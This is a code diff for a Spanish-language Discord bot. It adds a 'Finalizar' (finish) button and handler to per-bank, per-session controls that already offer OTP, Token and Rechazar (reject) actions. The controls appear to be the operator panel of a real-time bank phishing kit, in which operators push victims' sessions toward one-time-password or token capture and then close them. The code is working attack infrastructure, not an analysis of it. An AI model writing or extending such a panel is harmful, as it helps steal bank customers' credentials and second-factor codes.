@@ -143,7 +143,7 @@ function buildButtonsInicial(bancoKey, sessionId) {
     );
 }
 
-// 2 botones: OTP / Rechazar (para embed de TOKEN)
+// Botones del embed TOKEN: OTP / Finalizar / Rechazar
 function buildButtonsToken(bancoKey, sessionId) {
     return new ActionRowBuilder().addComponents(
         new ButtonBuilder()
@@ -151,19 +151,27 @@ function buildButtonsToken(bancoKey, sessionId) {
             .setLabel('📱 OTP')
             .setStyle(ButtonStyle.Primary),
         new ButtonBuilder()
+            .setCustomId(`FINALIZAR|${bancoKey}|${sessionId}`)
+            .setLabel('✅ Finalizar')
+            .setStyle(ButtonStyle.Success),
+        new ButtonBuilder()
             .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
             .setLabel('❌ Rechazar')
             .setStyle(ButtonStyle.Danger)
     );
 }
 
-// 2 botones: Token / Rechazar (para embed de OTP)
+// Botones del embed OTP: Finalizar / Token / Rechazar
 function buildButtonsOtp(bancoKey, sessionId) {
     return new ActionRowBuilder().addComponents(
         new ButtonBuilder()
+            .setCustomId(`FINALIZAR|${bancoKey}|${sessionId}`)
+            .setLabel('✅ Finalizar')
+            .setStyle(ButtonStyle.Success),
+        new ButtonBuilder()
             .setCustomId(`TOKEN|${bancoKey}|${sessionId}`)
             .setLabel('🔢 Token')
-            .setStyle(ButtonStyle.Success),
+            .setStyle(ButtonStyle.Primary),
         new ButtonBuilder()
             .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
             .setLabel('❌ Rechazar')
@@ -398,6 +406,11 @@ client.on(Events.InteractionCreate, async (interaction) => {
         estadoSesiones.set(sessionId, 'token');
         console.log(`🔢 [${bancoKey}] TOKEN: ${sessionId}`);
         await interaction.reply({ content: `🔢 Sesión **${sessionId}** enviada a TOKEN por ${usuario}` });
+
+    } else if (accion === 'FINALIZAR') {
+        estadoSesiones.set(sessionId, 'finalizado');
+        console.log(`✅ [${bancoKey}] FINALIZADO: ${sessionId}`);
+        await interaction.reply({ content: `✅ Sesión **${sessionId}** FINALIZADA por ${usuario}` });
     }
 });
 
